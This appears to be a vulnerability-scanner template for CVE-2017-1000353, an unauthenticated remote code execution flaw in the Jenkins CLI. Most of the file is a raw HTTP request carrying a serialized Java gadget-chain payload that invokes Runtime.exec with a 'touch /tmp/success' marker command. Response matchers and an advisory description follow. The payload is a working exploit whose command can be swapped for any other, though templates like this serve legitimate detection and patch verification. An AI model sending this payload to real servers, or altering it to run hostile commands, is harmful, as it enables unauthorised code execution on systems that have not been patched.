http:
- matchers:
  - type: word
    words:
    - at org.kohsuke
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - "POST /cli HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive\nTransfer-Encoding:\
    \ chunked\nContent-type: application/octet-stream\nSide: upload\n\n<===[JENKINS\
    \ REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=........sr./org.apache.commons.collections.map.ReferenceMap.....I.....xpw..........?@......sr.(java.util.concurrent.CopyOnWriteArraySetK.....i....L..alt.+Ljava/util/concurrent/CopyOnWriteArrayList;xpsr.)java.util.concurrent.CopyOnWriteArrayListx]..F......xpw.....sr.1org.apache.commons.collections.set.ListOrderedSet.......S...L..setOrdert..Ljava/util/List;xr.Corg.apache.commons.collections.set.AbstractSerializableSetDecorator...k.......xpsr..net.sf.json.JSONArray].To\\\
    (r....Z..expandElementsL..elementsq.~..xr..net.sf.json.AbstractJSON......?....xp.sr..java.util.ArrayListx.....a....I..sizexp....w.....t..asdfxxsq.~......w.....xsr.*java.util.concurrent.ConcurrentSkipListSet..Py...[...L..mt.-Ljava/util/concurrent/ConcurrentNavigableMap;xpsr.*java.util.concurrent.ConcurrentSkipListMap.Fu...F....L.\n\
    comparatort..Ljava/util/Comparator;xppsr..java.security.SignedObject\t..h*<.....[..contentt..[B[.\t\
    signatureq.~..L..thealgorithmt..Ljava/lang/String;xpur..[B......T....xp........sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.collections.keyvalue.TiedMapEntry....9......L..keyt..Ljava/lang/Object;L..mapt..Ljava/util/Map;xpt..foosr.*org.apache.commons.collections.map.LazyMapn....y.....L..factoryt.,Lorg/apache/commons/collections/Transformer;xpsr.:org.apache.commons.collections.functors.ChainedTransformer0...(z.....[.\n\
    iTransformerst.-[Lorg/apache/commons/collections/Transformer;xpur.-[Lorg.apache.commons.collections.Transformer;.V*..4.....xp....sr.;org.apache.commons.collections.functors.ConstantTransformerXv..A......L.\t\
    iConstantq.~..xpvr..java.lang.Runtime...........xpsr.:org.apache.commons.collections.functors.InvokerTransformer...k{|.8...[..iArgst..[Ljava/lang/Object;L..iMethodNamet..Ljava/lang/String;[..iParamTypest..[Ljava/lang/Class;xpur..[Ljava.lang.Object;..X..s)l...xp....t.\n\
    getRuntimeur..[Ljava.lang.Class;......Z....xp....t.\tgetMethoduq.~......vr..java.lang.String...8z;.B...xpvq.~..sq.~..uq.~......puq.~......t..invokeuq.~......vr..java.lang.Object...........xpvq.~..sq.~..ur..[Ljava.lang.String;..V...{G...xp....t..touch\
    \ /tmp/successt..execuq.~......q.~. sq.~..sr..java.lang.Integer.......8...I..valuexr..java.lang.Number...........xp....sr..java.util.HashMap......`....F.\n\
    loadFactorI.\tthresholdxp?@......w.........xxxuq.~......0,..../..W...W:.......8J..P.x..'!..7..p......Qt..DSAsr..java.lang.Boolean.\
    \ r........Z..valuexp.pxxq.~..sq.~..sq.~..w.....q.~.\nq.~..xq.~..px\n"
id: CVE-2017-1000353
info:
  author: pussycat0x
  description: 'Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier
    are vulnerable to an unauthenticated remote code execution. An unauthenticated
    remote code execution vulnerability allowed attackers to transfer a serialized
    Java `SignedObject` object to the Jenkins CLI, that would be deserialized using
    a new `ObjectInputStream`, bypassing the existing blacklist-based protection mechanism.
    We''re fixing this issue by adding `SignedObject` to the blacklist. We''re also
    backporting the new HTTP CLI protocol from Jenkins 2.54 to LTS 2.46.2, and deprecating
    the remoting-based (i.e. Java serialization) CLI protocol, disabling it by default.

    '
  metadata:
    verified: 'true'
  name: Jenkins => 2.56,2.46.1 LTS - Remote Code Execution
  reference:
  - https://community.f5.com/t5/technical-articles/jenkins-unsafe-deserialization-vulnerability-cve-2017-1000353/ta-p/283268
  severity: critical
  tags: cves,cve2017,jenkins,unauth,rce,intrusive
